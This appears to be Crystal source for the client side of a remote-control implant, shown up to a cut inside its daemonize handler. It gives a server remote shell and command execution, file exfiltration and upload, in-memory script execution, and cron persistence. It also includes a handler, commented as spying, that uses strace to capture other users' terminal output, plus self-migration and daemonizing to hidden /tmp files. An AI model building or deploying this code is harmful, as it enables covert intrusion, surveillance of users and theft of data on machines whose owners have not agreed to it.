require "base64"
require "digest/sha256"

# Monitors logged-in OS users and sends login/logout events to the server.
module LoginMonitor
  @@running = false
  @@generation = 0
  @@previous = {} of String => String

  def self.start(client : ProtocolClient)
    @@running = true
    @@previous = snapshot
    gen = (@@generation += 1)

    spawn do
      while @@running && @@generation == gen
        sleep 30.seconds
        next unless @@running && @@generation == gen

        current = snapshot

        (current.keys - @@previous.keys).each do |key|
          user, tty = key.split("@", 2)
          payload = JSON.parse(JSON.build do |j|
            j.object do
              j.field "user", user
              j.field "tty", tty
              j.field "time", current[key]
            end
          end)
          client.send(Envelope.new("user_login", payload: payload)) rescue nil
        end

        (@@previous.keys - current.keys).each do |key|
          user, tty = key.split("@", 2)
          payload = JSON.parse(JSON.build do |j|
            j.object do
              j.field "user", user
              j.field "tty", tty
            end
          end)
          client.send(Envelope.new("user_logout", payload: payload)) rescue nil
        end

        @@previous = current
      end
    end
  end

  def self.stop
    @@running = false
  end

  private def self.snapshot : Hash(String, String)
    result = {} of String => String
    stdout = IO::Memory.new
    Process.run("who", output: stdout, error: Process::Redirect::Close) rescue return result
    stdout.to_s.each_line do |line|
      fields = line.split
      next if fields.size < 3
      key = "#{fields[0]}@#{fields[1]}"
      time_str = fields.size >= 4 ? "#{fields[2]} #{fields[3]}" : fields[2]
      result[key] = time_str
    end
    result
  end
end

# Tracks state for an incoming file transfer (server pushing to us).
class TransferState
  property path : String
  property total_size : Int64
  property sha256 : String
  property data : IO::Memory
  property received : Int64

  def initialize(@path : String, @total_size : Int64, @sha256 : String)
    @data = IO::Memory.new
    @received = 0_i64
  end
end

# Registers all command handlers on a ProtocolClient.
# Handlers share a tracked CWD (independent of the process working directory)
# and a transfer state map for incoming uploads.
module Handlers
  CHUNK_SIZE = 65536
  CAT_LIMIT  = 1_048_576 # 1 MB

  def self.register(client : ProtocolClient)
    cwd = Dir.current
    transfers = {} of String => TransferState
    listen_procs = {} of String => Process
    shell_procs = {} of String => Process
    memfiles = {} of String => Bytes

    # ── filesystem: cd ──────────────────────────────────────────────────

    client.on("fs_cd") do |env|
      req_id = env.id
      path = env.payload.try(&.["path"]?.try(&.as_s))
      unless path
        client.send(Envelope.new("fs_reply", req_id, build({"error" => "missing path"})))
        next
      end

      target = File.expand_path(path, cwd)
      if Dir.exists?(target)
        cwd = target
        client.send(Envelope.new("fs_reply", req_id, build({"cwd" => cwd})))
      else
        client.send(Envelope.new("fs_reply", req_id, build({"error" => "no such directory: #{path}"})))
      end
    end

    # ── filesystem: pwd ─────────────────────────────────────────────────

    client.on("fs_pwd") do |env|
      client.send(Envelope.new("fs_reply", env.id, build({"cwd" => cwd})))
    end

    # ── filesystem: ls ──────────────────────────────────────────────────

    client.on("fs_ls") do |env|
      req_id = env.id
      path = env.payload.try(&.["path"]?.try(&.as_s))
      target_dir = path ? File.expand_path(path, cwd) : cwd

      unless Dir.exists?(target_dir)
        client.send(Envelope.new("fs_reply", req_id, build({"error" => "no such directory: #{target_dir}"})))
        next
      end

      begin
        entries = Dir.entries(target_dir)
          .reject { |e| e == "." || e == ".." }
          .sort
          .map { |e| Dir.exists?(File.join(target_dir, e)) ? "#{e}/" : e }

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "entries" do
              json.array { entries.each { |e| json.string e } }
            end
            json.field "path", target_dir
          end
        end)
        client.send(Envelope.new("fs_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("fs_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── filesystem: cat ─────────────────────────────────────────────────

    client.on("fs_cat") do |env|
      req_id = env.id
      path = env.payload.try(&.["path"]?.try(&.as_s))
      unless path
        client.send(Envelope.new("fs_reply", req_id, build({"error" => "missing path"})))
        next
      end

      full_path = File.expand_path(path, cwd)
      unless File.exists?(full_path) && File.file?(full_path)
        client.send(Envelope.new("fs_reply", req_id, build({"error" => "no such file: #{path}"})))
        next
      end

      begin
        size = File.size(full_path)
        if size > CAT_LIMIT
          client.send(Envelope.new("fs_reply", req_id, build({
            "error" => "file too large for cat (#{size} bytes, limit #{CAT_LIMIT}). Use download instead.",
          })))
          next
        end

        content = File.read(full_path)
        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "content", content
            json.field "size", size
          end
        end)
        client.send(Envelope.new("fs_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("fs_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── remote exec ─────────────────────────────────────────────────────

    client.on("exec") do |env|
      req_id = env.id
      cmd = env.payload.try(&.["cmd"]?.try(&.as_s))
      unless cmd
        client.send(Envelope.new("exec_reply", req_id, build({"error" => "missing cmd"})))
        next
      end

      begin
        stdout = IO::Memory.new
        stderr = IO::Memory.new
        status = Process.run(cmd, shell: true, output: stdout, error: stderr, chdir: cwd)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "stdout", stdout.to_s
            json.field "stderr", stderr.to_s
            json.field "exit_code", status.exit_code
          end
        end)
        client.send(Envelope.new("exec_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("exec_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── transfer: download (server requests file from us) ───────────────

    client.on("transfer_request") do |env|
      req_id = env.id
      path = env.payload.try(&.["path"]?.try(&.as_s))

      unless path
        client.send(Envelope.new("transfer_error", req_id, build({"error" => "missing path"})))
        next
      end

      full_path = File.expand_path(path, cwd)
      unless File.exists?(full_path) && File.file?(full_path)
        client.send(Envelope.new("transfer_error", req_id, build({"error" => "file not found: #{path}"})))
        next
      end

      begin
        data = File.read(full_path).to_slice
        sha256 = Digest::SHA256.hexdigest(data)
        total_size = data.bytesize

        # Send metadata
        start_payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "total_size", total_size
            json.field "chunk_size", CHUNK_SIZE
            json.field "sha256", sha256
            json.field "filename", File.basename(full_path)
          end
        end)
        client.send(Envelope.new("transfer_start", req_id, start_payload))

        # Send chunks
        offset = 0
        index = 0
        while offset < total_size
          chunk_end = Math.min(offset + CHUNK_SIZE, total_size)
          chunk = data[offset...chunk_end]
          b64 = Base64.strict_encode(chunk)

          chunk_payload = JSON.parse(JSON.build do |json|
            json.object do
              json.field "index", index
              json.field "data", b64
            end
          end)
          client.send(Envelope.new("transfer_chunk", req_id, chunk_payload))

          offset = chunk_end
          index += 1
        end

        client.send(Envelope.new("transfer_done", req_id))
      rescue ex
        client.send(Envelope.new("transfer_error", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── transfer: upload (server pushes file to us) ─────────────────────

    client.on("transfer_push") do |env|
      req_id = env.id
      next unless req_id

      payload = env.payload
      next unless payload

      path = payload["path"].as_s
      total_size = payload["total_size"].as_i64
      sha256 = payload["sha256"].as_s

      transfers[req_id] = TransferState.new(
        path: File.expand_path(path, cwd),
        total_size: total_size,
        sha256: sha256
      )
    end

    client.on("transfer_chunk") do |env|
      req_id = env.id
      next unless req_id

      if state = transfers[req_id]?
        b64 = env.payload.try(&.["data"]?.try(&.as_s))
        next unless b64
        chunk = Base64.decode(b64)
        state.data.write(chunk)
        state.received += chunk.bytesize.to_i64
      end
    end

    client.on("transfer_done") do |env|
      req_id = env.id
      next unless req_id

      state = transfers[req_id]?
      next unless state

      begin
        state.data.rewind
        data = Bytes.new(state.data.bytesize)
        state.data.read_fully(data)

        sha256 = Digest::SHA256.hexdigest(data)
        success = sha256 == state.sha256

        if success
          dir = File.dirname(state.path)
          Dir.mkdir_p(dir) unless Dir.exists?(dir)
          File.open(state.path, "wb") { |f| f.write(data) }
        end

        ack_payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "success", success
            json.field "size", data.bytesize
            unless success
              json.field "error", "SHA256 mismatch: expected #{state.sha256}, got #{sha256}"
            end
          end
        end)
        client.send(Envelope.new("transfer_ack", req_id, ack_payload))
      rescue ex
        client.send(Envelope.new("transfer_ack", req_id, build({
          "success" => "false",
          "error"   => ex.message.to_s,
        })))
      ensure
        transfers.delete(req_id)
      end
    end

    # ── sysadmin: ps ──────────────────────────────────────────────────────

    client.on("sys_ps") do |env|
      req_id = env.id
      filter = env.payload.try(&.["filter"]?.try(&.as_s))

      begin
        stdout = IO::Memory.new
        Process.run("ps", ["aux", "--no-headers", "-ww"], output: stdout)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "processes" do
              json.array do
                stdout.to_s.each_line do |line|
                  fields = line.split(11)
                  next if fields.size < 11
                  if filter
                    next unless line.downcase.includes?(filter.downcase)
                  end
                  json.object do
                    json.field "user", fields[0]
                    json.field "pid", fields[1].to_i
                    json.field "cpu", fields[2]
                    json.field "mem", fields[3]
                    json.field "vsz", fields[4].to_i64
                    json.field "rss", fields[5].to_i64
                    json.field "stat", fields[7]
                    json.field "command", fields[10]
                  end
                end
              end
            end
          end
        end)
        client.send(Envelope.new("sys_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("sys_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── sysadmin: top (one-shot snapshot) ─────────────────────────────────

    client.on("sys_top") do |env|
      req_id = env.id

      begin
        # CPU: two samples 0.5s apart
        stat1 = File.read("/proc/stat").lines.first.split[1..].map(&.to_i64)
        sleep 500.milliseconds
        stat2 = File.read("/proc/stat").lines.first.split[1..].map(&.to_i64)

        total_d = stat2.sum - stat1.sum
        idle_d  = (stat2[3] + stat2[4]) - (stat1[3] + stat1[4])
        cpu_pct = total_d > 0 ? (100.0 * (1.0 - idle_d.to_f / total_d.to_f)) : 0.0

        # Memory from /proc/meminfo
        mem = {} of String => Int64
        File.each_line("/proc/meminfo") do |line|
          if m = line.match(/^(\w+):\s+(\d+)/)
            mem[m[1]] = m[2].to_i64 * 1024
          end
        end

        mem_total     = mem["MemTotal"]? || 0_i64
        mem_available = mem["MemAvailable"]? || (mem["MemFree"]? || 0_i64)
        mem_used      = mem_total - mem_available
        swap_total    = mem["SwapTotal"]? || 0_i64
        swap_free     = mem["SwapFree"]? || 0_i64

        # Load & uptime
        load_parts = File.read("/proc/loadavg").split
        uptime     = File.read("/proc/uptime").split.first.to_f
        cpu_count  = File.read("/proc/cpuinfo").lines.count(&.starts_with?("processor"))

        # Disk
        df_out = IO::Memory.new
        Process.run("df", ["-B1", "-x", "tmpfs", "-x", "devtmpfs", "-x", "squashfs",
                           "-x", "overlay", "--output=target,size,used,avail,pcent"],
                    output: df_out, error: Process::Redirect::Close)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "cpu_percent", cpu_pct.round(1)
            json.field "cpu_count", cpu_count
            json.field "load_1", load_parts[0]
            json.field "load_5", load_parts[1]
            json.field "load_15", load_parts[2]
            json.field "uptime", uptime
            json.field "mem_total", mem_total
            json.field "mem_used", mem_used
            json.field "swap_total", swap_total
            json.field "swap_used", swap_total - swap_free
            json.field "disks" do
              json.array do
                df_out.to_s.each_line.skip(1).each do |line|
                  fields = line.split
                  next if fields.size < 5
                  next if fields[0].starts_with?("/snap") || fields[0].starts_with?("/boot/efi")
                  json.object do
                    json.field "mount", fields[0]
                    json.field "total", fields[1].to_i64
                    json.field "used", fields[2].to_i64
                    json.field "avail", fields[3].to_i64
                    json.field "percent", fields[4].gsub("%", "").to_f
                  end
                end
              end
            end
          end
        end)
        client.send(Envelope.new("sys_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("sys_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── sysadmin: reboot / shutdown ──────────────────────────────────────

    client.on("sys_reboot") do |env|
      client.send(Envelope.new("sys_reply", env.id, build({"status" => "rebooting"})))
      spawn do
        sleep 500.milliseconds
        Process.run("reboot", shell: false) rescue nil
      end
    end

    client.on("sys_shutdown") do |env|
      client.send(Envelope.new("sys_reply", env.id, build({"status" => "shutting down"})))
      spawn do
        sleep 500.milliseconds
        Process.run("shutdown", ["-h", "now"], shell: false) rescue nil
      end
    end

    # ── network: ifconfig ────────────────────────────────────────────────

    client.on("net_ifconfig") do |env|
      req_id = env.id

      begin
        ifaces = {} of String => Hash(String, JSON::Any)

        # Read interfaces from sysfs
        Dir.entries("/sys/class/net").reject { |e| e == "." || e == ".." }.sort.each do |name|
          base = "/sys/class/net/#{name}"
          info = {} of String => JSON::Any
          info["state"] = JSON::Any.new((File.read("#{base}/operstate").strip rescue "unknown"))
          info["mtu"]   = JSON::Any.new((File.read("#{base}/mtu").strip rescue "unknown"))
          info["mac"]   = JSON::Any.new((File.read("#{base}/address").strip rescue "unknown"))

          rx_b = (File.read("#{base}/statistics/rx_bytes").strip.to_i64 rescue 0_i64)
          tx_b = (File.read("#{base}/statistics/tx_bytes").strip.to_i64 rescue 0_i64)
          rx_p = (File.read("#{base}/statistics/rx_packets").strip.to_i64 rescue 0_i64)
          tx_p = (File.read("#{base}/statistics/tx_packets").strip.to_i64 rescue 0_i64)
          info["rx_bytes"]   = JSON::Any.new(rx_b)
          info["tx_bytes"]   = JSON::Any.new(tx_b)
          info["rx_packets"] = JSON::Any.new(rx_p)
          info["tx_packets"] = JSON::Any.new(tx_p)

          ifaces[name] = info
        end

        # Get IP addresses via `ip -o addr show`
        addr_out = IO::Memory.new
        Process.run("ip", ["-o", "addr", "show"], output: addr_out, error: Process::Redirect::Close)
        addr_out.to_s.each_line do |line|
          parts = line.split
          next if parts.size < 4
          name = parts[1].split("@")[0]
          iface = ifaces[name]?
          next unless iface

          key = parts[2] == "inet" ? "ipv4" : (parts[2] == "inet6" ? "ipv6" : nil)
          next unless key

          existing = iface[key]?.try(&.as_a?) || [] of JSON::Any
          existing << JSON::Any.new(parts[3])
          iface[key] = JSON::Any.new(existing)
        end

        payload = JSON::Any.new({
          "interfaces" => JSON::Any.new(
            ifaces.transform_values { |v| JSON::Any.new(v) }
          ),
        } of String => JSON::Any)
        client.send(Envelope.new("net_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("net_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── network: netstat ─────────────────────────────────────────────────

    client.on("net_netstat") do |env|
      req_id = env.id
      mode = env.payload.try(&.["mode"]?.try(&.as_s)) || "listening"

      ss_args = case mode
                when "listening"    then ["-tlnp"]
                when "established"  then ["-tnp", "state", "established"]
                when "all"          then ["-tunap"]
                when "udp"          then ["-ulnp"]
                else                     ["-tlnp"]
                end

      begin
        stdout = IO::Memory.new
        Process.run("ss", ss_args, output: stdout, error: Process::Redirect::Close)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "mode", mode
            json.field "sockets" do
              json.array do
                stdout.to_s.each_line.skip(1).each do |line|
                  fields = line.split
                  next if fields.size < 5

                  proto      = fields[0].downcase
                  local_addr = fields[4]

                  peer_addr = fields.size > 5 ? fields[5] : "*:*"

                  # Process info is in the last field if present: users:(("name",pid=N,fd=N))
                  proc_info = ""
                  user_info = ""
                  fields.each do |f|
                    if m = f.match(/users:\(\("([^"]+)",pid=(\d+)/)
                      proc_info = "#{m[2]}/#{m[1]}"
                    end
                  end

                  json.object do
                    json.field "proto", proto
                    json.field "local", local_addr
                    json.field "peer", peer_addr
                    json.field "state", fields[1] if mode != "listening" || fields.size > 5
                    json.field "process", proc_info
                  end
                end
              end
            end
          end
        end)
        client.send(Envelope.new("net_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("net_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── sessions: list logged-in OS users ──────────────────────────────────

    client.on("sys_who") do |env|
      req_id = env.id

      begin
        stdout = IO::Memory.new
        Process.run("who", ["-u"], output: stdout, error: Process::Redirect::Close)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "sessions" do
              json.array do
                stdout.to_s.each_line do |line|
                  fields = line.split
                  next if fields.size < 5
                  json.object do
                    json.field "user", fields[0]
                    json.field "tty", fields[1]
                    json.field "date", fields[2]
                    json.field "time", fields[3]
                    json.field "idle", fields[4]
                    json.field "pid", fields.size > 5 ? fields[5] : ""
                  end
                end
              end
            end
          end
        end)
        client.send(Envelope.new("session_reply", req_id, payload))
      rescue ex
        client.send(Envelope.new("session_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── sessions: kill user session ────────────────────────────────────────

    client.on("session_kill") do |env|
      req_id = env.id
      tty = env.payload.try(&.["tty"]?.try(&.as_s))
      unless tty
        client.send(Envelope.new("session_reply", req_id, build({"error" => "missing tty"})))
        next
      end

      begin
        stderr = IO::Memory.new
        status = Process.run("pkill", ["-KILL", "-t", tty],
          output: Process::Redirect::Close, error: stderr)

        if status.success?
          client.send(Envelope.new("session_reply", req_id, build({"status" => "killed sessions on #{tty}"})))
        else
          err = stderr.to_s.strip
          err = "no matching processes" if err.empty?
          client.send(Envelope.new("session_reply", req_id, build({"error" => "pkill: #{err}"})))
        end
      rescue ex
        client.send(Envelope.new("session_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── sessions: write to user terminal ──────────────────────────────────

    client.on("session_write") do |env|
      req_id = env.id
      payload = env.payload
      next unless payload

      tty = payload["tty"]?.try(&.as_s)
      message = payload["message"]?.try(&.as_s)
      unless tty && message
        client.send(Envelope.new("session_reply", req_id, build({"error" => "missing tty or message"})))
        next
      end

      begin
        tty_path = "/dev/#{tty}"
        unless File.exists?(tty_path)
          client.send(Envelope.new("session_reply", req_id, build({"error" => "no such tty: #{tty}"})))
          next
        end

        File.open(tty_path, "w") do |f|
          f.print "\r\n\e[1;33m[glob-vm]\e[0m #{message}\r\n"
        end
        client.send(Envelope.new("session_reply", req_id, build({"status" => "message sent to #{tty}"})))
      rescue ex
        client.send(Envelope.new("session_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── sessions: listen (spy on terminal via strace) ─────────────────────

    client.on("session_listen") do |env|
      req_id = env.id
      next unless req_id
      tty = env.payload.try(&.["tty"]?.try(&.as_s))
      unless tty
        client.send(Envelope.new("session_reply", req_id, build({"error" => "missing tty"})))
        next
      end

      # Find the session leader PID on this tty
      pid_out = IO::Memory.new
      Process.run("ps", ["-t", tty, "-o", "pid=", "--sort=start_time"],
        output: pid_out, error: Process::Redirect::Close)
      pid = pid_out.to_s.strip.split("\n").first?.try(&.strip)

      unless pid && !pid.empty?
        client.send(Envelope.new("session_reply", req_id, build({"error" => "no process found on #{tty}"})))
        next
      end

      begin
        proc = Process.new("strace",
          ["-e", "trace=write", "-s", "16384", "-xx", "-q", "-p", pid],
          output: Process::Redirect::Close, error: :pipe)
        listen_procs[req_id] = proc

        client.send(Envelope.new("session_reply", req_id, JSON.parse(JSON.build do |j|
          j.object do
            j.field "status", "listening on #{tty} (pid #{pid})"
            j.field "listen_id", req_id
          end
        end)))

        spawn do
          begin
            while listen_procs[req_id]?
              line = proc.error.gets
              break unless line

              if m = line.match(/write\((\d+), "(.+)"\.{0,3}, \d+\)/)
                fd = m[1].to_i
                next unless fd == 1 || fd == 2
                decoded = Handlers.unescape_strace(m[2])
                b64 = Base64.strict_encode(decoded)
                data_payload = JSON.parse(
                  JSON.build { |j| j.object {
                    j.field "data", b64
                    j.field "listen_id", req_id
                  }}
                )
                client.send(Envelope.new("session_data", req_id, data_payload))
              end
            end
          rescue
          ensure
            if p = listen_procs.delete(req_id)
              p.signal(Signal::TERM) rescue nil
              p.wait rescue nil
            end
          end
        end
      rescue ex
        client.send(Envelope.new("session_reply", req_id, build({"error" => "listen failed: #{ex.message}"})))
      end
    end

    # ── sessions: stop listening ──────────────────────────────────────────

    client.on("session_listen_stop") do |env|
      listen_id = env.payload.try(&.["listen_id"]?.try(&.as_s))
      if listen_id && (proc = listen_procs.delete(listen_id))
        proc.signal(Signal::TERM) rescue nil
        proc.wait rescue nil
        client.send(Envelope.new("session_reply", env.id, build({"status" => "stopped listening"})))
      else
        client.send(Envelope.new("session_reply", env.id, build({"error" => "no active listen session"})))
      end
    end

    # ── interactive shell ──────────────────────────────────────────────────

    client.on("shell_open") do |env|
      req_id = env.id
      next unless req_id

      begin
        process = Process.new("bash", ["-i"],
          input: Process::Redirect::Pipe,
          output: Process::Redirect::Pipe,
          error: Process::Redirect::Pipe,
          env: {"TERM" => "dumb"})
        shell_procs[req_id] = process
        client.send(Envelope.new("shell_ready", req_id, build({"status" => "ok"})))

        spawn do
          begin
            buffer = Bytes.new(4096)
            loop do
              n = process.output.read(buffer)
              break if n == 0
              b64 = Base64.strict_encode(buffer[0, n])
              payload = JSON.parse(JSON.build { |j| j.object { j.field "data", b64 } })
              client.send(Envelope.new("shell_output", req_id, payload))
            end
          rescue
          ensure
            if shell_procs.delete(req_id)
              client.send(Envelope.new("shell_closed", req_id))
            end
          end
        end

        spawn do
          begin
            buffer = Bytes.new(4096)
            loop do
              n = process.error.read(buffer)
              break if n == 0
              b64 = Base64.strict_encode(buffer[0, n])
              payload = JSON.parse(JSON.build { |j| j.object { j.field "data", b64 } })
              client.send(Envelope.new("shell_output", req_id, payload))
            end
          rescue
          end
        end
      rescue ex
        client.send(Envelope.new("shell_ready", req_id, build({"error" => ex.message.to_s})))
      end
    end

    client.on("shell_data") do |env|
      req_id = env.id
      next unless req_id
      process = shell_procs[req_id]?
      next unless process

      data = env.payload.try(&.["data"]?.try(&.as_s))
      next unless data

      begin
        process.input.print(data)
        process.input.flush
      rescue
      end
    end

    client.on("shell_close") do |env|
      req_id = env.id
      next unless req_id
      process = shell_procs.delete(req_id)
      if process
        process.input.close rescue nil
        process.signal(Signal::TERM) rescue nil
        spawn { process.wait rescue nil }
      end
    end

    # ── memfile: in-memory script buffers ────────────────────────────────

    client.on("memfile_write") do |env|
      req_id = env.id
      payload = env.payload
      next unless payload

      name = payload["name"]?.try(&.as_s)
      b64 = payload["data"]?.try(&.as_s)
      unless name && b64
        client.send(Envelope.new("memfile_reply", req_id, build({"error" => "missing name or data"})))
        next
      end

      data = Base64.decode(b64)
      memfiles[name] = data
      client.send(Envelope.new("memfile_reply", req_id, build({"status" => "wrote #{data.size} bytes to '#{name}'"})))
    end

    client.on("memfile_read") do |env|
      req_id = env.id
      name = env.payload.try(&.["name"]?.try(&.as_s))
      unless name
        client.send(Envelope.new("memfile_reply", req_id, build({"error" => "missing name"})))
        next
      end

      data = memfiles[name]?
      unless data
        client.send(Envelope.new("memfile_reply", req_id, build({"error" => "no such memfile: #{name}"})))
        next
      end

      payload = JSON.parse(JSON.build do |json|
        json.object do
          json.field "name", name
          json.field "data", Base64.strict_encode(data)
          json.field "size", data.size
        end
      end)
      client.send(Envelope.new("memfile_reply", req_id, payload))
    end

    client.on("memfile_exec") do |env|
      req_id = env.id
      payload = env.payload
      next unless payload

      name = payload["name"]?.try(&.as_s)
      interpreter = payload["interpreter"]?.try(&.as_s) || "bash"
      exec_args = payload["args"]?.try(&.as_s)

      unless name
        client.send(Envelope.new("memfile_reply", req_id, build({"error" => "missing name"})))
        next
      end

      data = memfiles[name]?
      unless data
        client.send(Envelope.new("memfile_reply", req_id, build({"error" => "no such memfile: #{name}"})))
        next
      end

      begin
        stdout = IO::Memory.new
        stderr = IO::Memory.new

        interp_args = case interpreter
                      when "bash", "sh" then ["-s"]
                      when "python", "python3", "ruby", "perl", "node" then ["-"]
                      else ["-"]
                      end
        interp_args.concat(exec_args.split) if exec_args

        status = Process.run(interpreter, interp_args,
          input: IO::Memory.new(data), output: stdout, error: stderr, chdir: cwd)

        reply_payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "stdout", stdout.to_s
            json.field "stderr", stderr.to_s
            json.field "exit_code", status.exit_code
          end
        end)
        client.send(Envelope.new("memfile_reply", req_id, reply_payload))
      rescue ex
        client.send(Envelope.new("memfile_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    client.on("memfile_list") do |env|
      req_id = env.id
      payload = JSON.parse(JSON.build do |json|
        json.object do
          json.field "files" do
            json.array do
              memfiles.each do |name, data|
                json.object do
                  json.field "name", name
                  json.field "size", data.size
                end
              end
            end
          end
        end
      end)
      client.send(Envelope.new("memfile_reply", req_id, payload))
    end

    client.on("memfile_delete") do |env|
      req_id = env.id
      name = env.payload.try(&.["name"]?.try(&.as_s))
      unless name
        client.send(Envelope.new("memfile_reply", req_id, build({"error" => "missing name"})))
        next
      end

      if memfiles.delete(name)
        client.send(Envelope.new("memfile_reply", req_id, build({"status" => "deleted '#{name}'"})))
      else
        client.send(Envelope.new("memfile_reply", req_id, build({"error" => "no such memfile: #{name}"})))
      end
    end

    # ── cron: manage cron jobs ────────────────────────────────────────────

    client.on("cron_list") do |env|
      req_id = env.id
      begin
        user = env.payload.try(&.["user"]?.try(&.as_s))
        args = user ? ["-l", "-u", user] : ["-l"]
        stdout = IO::Memory.new
        stderr = IO::Memory.new
        status = Process.run("crontab", args, output: stdout, error: stderr)

        if status.success?
          payload = JSON.parse(JSON.build do |json|
            json.object do
              json.field "entries" do
                json.array do
                  stdout.to_s.each_line { |line| json.string line }
                end
              end
            end
          end)
          client.send(Envelope.new("cron_reply", req_id, payload))
        else
          err = stderr.to_s.strip
          err = "no crontab" if err.includes?("no crontab")
          client.send(Envelope.new("cron_reply", req_id, build({"error" => err})))
        end
      rescue ex
        client.send(Envelope.new("cron_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    client.on("cron_add") do |env|
      req_id = env.id
      payload = env.payload
      next unless payload

      entry = payload["entry"]?.try(&.as_s)
      user = payload["user"]?.try(&.as_s)
      unless entry
        client.send(Envelope.new("cron_reply", req_id, build({"error" => "missing entry"})))
        next
      end

      begin
        existing = IO::Memory.new
        list_args = user ? ["-l", "-u", user] : ["-l"]
        Process.run("crontab", list_args, output: existing, error: Process::Redirect::Close)

        new_crontab = existing.to_s.rstrip + "\n" + entry + "\n"
        set_args = user ? ["-u", user, "-"] : ["-"]
        stderr = IO::Memory.new
        status = Process.run("crontab", set_args,
          input: IO::Memory.new(new_crontab), output: Process::Redirect::Close, error: stderr)

        if status.success?
          client.send(Envelope.new("cron_reply", req_id, build({"status" => "added: #{entry}"})))
        else
          client.send(Envelope.new("cron_reply", req_id, build({"error" => stderr.to_s.strip})))
        end
      rescue ex
        client.send(Envelope.new("cron_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    client.on("cron_remove") do |env|
      req_id = env.id
      payload = env.payload
      next unless payload

      index = payload["index"]?.try(&.as_i)
      user = payload["user"]?.try(&.as_s)
      unless index
        client.send(Envelope.new("cron_reply", req_id, build({"error" => "missing index"})))
        next
      end

      begin
        existing = IO::Memory.new
        list_args = user ? ["-l", "-u", user] : ["-l"]
        Process.run("crontab", list_args, output: existing, error: Process::Redirect::Close)

        lines = existing.to_s.lines
        if index < 0 || index >= lines.size
          client.send(Envelope.new("cron_reply", req_id, build({"error" => "index #{index} out of range (0..#{lines.size - 1})"})))
          next
        end

        removed = lines.delete_at(index)
        new_crontab = lines.join("\n") + "\n"
        set_args = user ? ["-u", user, "-"] : ["-"]
        stderr = IO::Memory.new
        status = Process.run("crontab", set_args,
          input: IO::Memory.new(new_crontab), output: Process::Redirect::Close, error: stderr)

        if status.success?
          client.send(Envelope.new("cron_reply", req_id, build({"status" => "removed: #{removed.strip}"})))
        else
          client.send(Envelope.new("cron_reply", req_id, build({"error" => stderr.to_s.strip})))
        end
      rescue ex
        client.send(Envelope.new("cron_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    # ── daemon: restart / migrate ──────────────────────────────────────

    client.on("daemon_restart") do |env|
      req_id = env.id
      binary = Process.executable_path
      unless binary
        client.send(Envelope.new("daemon_reply", req_id, build({"error" => "cannot determine executable path"})))
        next
      end

      client.send(Envelope.new("daemon_reply", req_id, build({"status" => "restarting from #{binary}"})))
      sleep 500.milliseconds

      begin
        Process.exec(binary, ARGV)
      rescue ex
        STDERR.puts "[!] restart failed: #{ex.message}"
      end
    end

    client.on("daemon_migrate") do |env|
      req_id = env.id
      payload = env.payload
      next unless payload

      target_path = payload["path"]?.try(&.as_s)
      b64_data = payload["data"]?.try(&.as_s)

      unless target_path
        client.send(Envelope.new("daemon_reply", req_id, build({"error" => "missing target path"})))
        next
      end

      begin
        if b64_data
          data = Base64.decode(b64_data)
          dir = File.dirname(target_path)
          Dir.mkdir_p(dir) unless Dir.exists?(dir)
          File.write(target_path, data, perm: File::Permissions.new(0o755))
        else
          current = Process.executable_path
          unless current
            client.send(Envelope.new("daemon_reply", req_id, build({"error" => "cannot determine current binary"})))
            next
          end
          dir = File.dirname(target_path)
          Dir.mkdir_p(dir) unless Dir.exists?(dir)
          File.copy(current, target_path)
          File.chmod(target_path, File::Permissions.new(0o755))
        end

        client.send(Envelope.new("daemon_reply", req_id, build({"status" => "migrating to #{target_path}"})))
        sleep 500.milliseconds

        Process.exec(target_path, ARGV)
      rescue ex
        client.send(Envelope.new("daemon_reply", req_id, build({"error" => ex.message.to_s})))
      end
    end

    client.on("daemon_kill") do |env|
      req_id = env.id
      client.send(Envelope.new("daemon_reply", req_id, build({"status" => "shutting down daemon"})))
      sleep 200.milliseconds
      exit 0
    end

    client.on("daemon_daemonize") do |env|
      req_id = env.id
      payload = env.payload

      binary = Process.executable_path
      unless binary
        client.send(Envelope.new("daemon_reply", req_id, build({"error" => "cannot determine executable path"})))
        next
      end

      log_path = payload.try(&.["log"]?.try(&.as_s)) || "/tmp/.red-cat.log"
      pid_path = payload.try(&.["pidfile"]?.try(&.as_s)) || "/tmp/.red-kitty.pid"

      begin
        log_dir = File.dirname(log_path)
        Dir.mkdir_p(log_dir) unless Dir.exists?(log_dir)

        log_file = File.open(log_path, "a")

        process = Process.new("setsid", [binary] + ARGV.to_a,
          input: Process::Redirect::Close,
          output: log_file,
          error: log_file)

        File.write(pid_path, process.pid.to_s)

        payload = JSON.parse(JSON.build do |json|
          json.object do
            json.field "status", "daemonized"
            json.field "pid", process.pid
            json.field "log", log_path
            json.field "pidfile", pid_path
          end
        end)
        client.send(Envelope.new("daemon_reply", req_id, payload))

